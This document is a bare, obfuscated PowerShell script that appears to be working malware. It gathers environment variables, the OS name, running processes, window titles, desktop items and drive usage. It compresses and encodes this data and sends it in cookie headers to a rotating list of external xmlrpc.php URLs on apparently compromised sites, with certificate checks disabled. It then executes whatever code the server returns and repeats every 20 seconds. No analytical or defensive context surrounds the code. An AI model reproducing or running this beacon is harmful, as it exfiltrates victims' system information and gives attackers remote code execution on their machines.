function tYcwS($YzvKQ) {
    $rkpcyX = "632DAF1175"
    
    function TQfC($jMauU) {
        $ewJtr = [System.IO.MemoryStream]::New()
        $LFQAIR = [System.IO.StreamWriter]::New((New-Object System.IO.Compression.GZipStream($ewJtr, [System.IO.Compression.CompressionMode]::Compress)))
        $LFQAIR.Write([String]::Join("|!", $jMauU))
        $LFQAIR.Close()
        [System.Convert]::ToBase64String($ewJtr.ToArray())
    }
    
    $bSmlkU = ("iSfOlDer|SHeLl.applIcAtiON|nAmESPacE|iTeMS|isLinK|NAMe|isfIleSYsTEM").split("|")
    $OXvrMyC = TQfC((Get-ChildItem env: | Where-Object { $_.Value.Length -lt 99 } | ForEach-Object { ($_.Name + "^" + $_.Value) }) + ("OSWMI^" + (Get-WmiObject Win32_OperatingSystem).Caption))
    $goeIZ = TQfC(Get-Process | Select-Object Name -Unique | ForEach-Object { $_.Name })
    $VAMwC = TQfC(Get-Process | Where-Object { $_.MainWindowTitle } | ForEach-Object { $_.Name + "^" + $_.MainWindowTitle })
    $nKyVs = TQfC(((New-Object -ComObject ($bSmlkU[1])).($bSmlkU[2])(0)) | ForEach-Object {
        if ($_.($bSmlkU[4])) {
            "0" + $_.($bSmlkU[5])
        }
        elseif ($_.($bSmlkU[0])) {
            "1" + $_.($bSmlkU[5])
        }
        elseif ($_.($bSmlkU[6])) {
            "2" + [IO.Path]::GetFileName($_.Path)
        }
        else {
            "3" + $_.($bSmlkU[5])
        }
    })
    $rNqoMBW = TQfC(Get-PSDrive | Where-Object { $_.Free -gt 50000 } | ForEach-Object { $_.Name + "^" + $_.Used })
    
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
    
    $kOEyJ = [System.Net.WebRequest]::Create($YzvKQ)
    $kOEyJ.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
    $kOEyJ.KeepAlive = 0
    $kOEyJ.Headers.Add("Cookie: $rkpcyX=$OXvrMyC; $rkpcyX`1=$goeIZ; $rkpcyX`2=$VAMwC; $rkpcyX`3=$nKyVs; $rkpcyX`4=$rNqoMBW")
    
    $oHyLIMs = New-Object System.IO.StreamReader $kOEyJ.GetResponse().GetResponseStream()
    $FSOUvdF = ($oHyLIMs.ReadToEnd()) -split $rkpcyX
    
    if ($FSOUvdF.Count -eq 3) {
        iex($FSOUvdF[1] -replace "^", "")
    }
}

while (1) {
    try {
        tYcwS(@("https://funtop.tw/xmlrpc.php", "http://sspcresidential.com/xmlrpc.php", "https://magnal-logistics.com/xmlrpc.php", "http://claudeabouchacra.com/xmlrpc.php", "https://pintravel.co.za/xmlrpc.php", "https://dealz.pl/xmlrpc.php", "https://ozayplise.com/xmlrpc.php", "https://moosicborough.com/xmlrpc.php", "https://bevcooks.com/xmlrpc.php", "https://lempod.com/xmlrpc.php") | Get-Random)
    }
    catch {}
    
    Sleep -Seconds 20
}
